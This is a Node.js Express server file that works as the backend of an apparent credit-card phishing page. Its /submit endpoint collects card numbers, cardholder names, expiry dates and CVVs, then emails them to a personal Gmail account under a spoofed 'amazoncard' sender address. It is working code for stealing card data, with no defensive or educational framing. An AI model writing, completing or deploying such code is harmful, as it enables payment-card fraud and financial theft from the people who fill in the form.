const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/submit', (req, res) => {
    const { cardNumber, cardName, expiryMonth, expiryYear, cvv } = req.body;

    // Set up the email transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail', // or any other email service
        auth: {
            user: 'colterliam101@gmail.com', // replace with your email
            pass: 'your-email-password'   // replace with your email password
        }
    });

    // Set up the email data
    const mailOptions = {
        from: 'amazoncard@new.com', // sender address
        to: 'colterliam101@gmail.com',   // list of receivers
        subject: 'New Credit Card Submission', // Subject line
        text: `Card Number: ${cardNumber}\nCard Name: ${cardName}\nExpiry Date: ${expiryMonth}/${expiryYear}\nCVV: ${cvv}`, // plain text body
        html: `<p>Card Number: ${cardNumber}</p><p>Card Name: ${cardName}</p><p>Expiry Date: ${expiryMonth}/${expiryYear}</p><p>CVV: ${cvv}</p>` // html body
    };

    // Send the email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        res.json({ success: true });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
